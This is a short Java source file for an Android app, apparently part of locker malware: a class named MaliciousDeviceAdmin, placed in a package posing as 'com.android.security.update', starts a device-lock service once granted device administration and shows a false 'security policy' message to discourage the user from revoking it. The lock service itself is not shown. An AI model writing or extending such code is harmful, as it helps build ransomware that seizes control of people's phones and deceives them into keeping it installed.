package com.android.security.update;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class MaliciousDeviceAdmin extends DeviceAdminReceiver {
    
    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        startLockService(context);
    }
    
    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        return "Security policy requires device administration.";
    }
    
    private void startLockService(Context context) {
        Intent serviceIntent = new Intent(context, DeviceLockService.class);
        context.startService(serviceIntent);
    }
}
